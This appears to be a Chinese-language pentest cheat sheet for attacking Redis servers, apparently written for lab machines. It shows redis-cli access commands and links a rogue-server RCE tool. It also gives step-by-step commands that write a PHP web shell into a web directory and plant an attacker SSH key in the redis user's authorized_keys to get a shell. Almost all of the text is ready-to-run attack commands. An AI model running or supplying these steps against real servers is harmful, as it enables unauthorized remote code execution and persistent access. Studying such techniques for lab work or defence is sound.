```bash
redis-cli -h <IP>    链接Redis
auth <PASSWD>     (身份验证)
```

```
keys * (获取所有的键)
incr xxx  (新建值)
get xxx  (获取值)
config get dir (配置文件所在的目录)
```

##### Redis Version < 5.0.5   ,   RCE
https://github.com/n0b0dyCN/redis-rogue-server?source=post_page-----49920d4188de--------------------------------


**Redis Shell 写 WebShell**
```bash
config set dir "C:/xxxxxxx"
CONFIG SET dbfilename shell.php
SET webshell "<?php system($_GET['cmd']); ?>"
save
```
如果出现 `(error) READONLY You can't write against a read only slave.` 的错误，尝试
```
SLAVEOF NO ONE
```

# 利用

可以尝试是否存在 `/var/lib/redis/.ssh` 文件夹？
```
config set dir ./.ssh
config get dir
```
成功修改就表明改目录存在。
```bash
ssh-keygen -f te   (生成一对密码)
(echo -e "\n\n"; cat te.pub; echo -e "\n\n") > spaced_key.txt  (收尾添加空格)
```
添加键
```
cat spaced_key.txt | redis-cli -h 10.129.2.1 -x set xek  (kali)
config set dbfilename "authorized_keys"  (修改名字)
save  (保存修改)
```
获得 shell
```bash
chmod 600 te ; ssh -i te redis@10.129.2.1
```

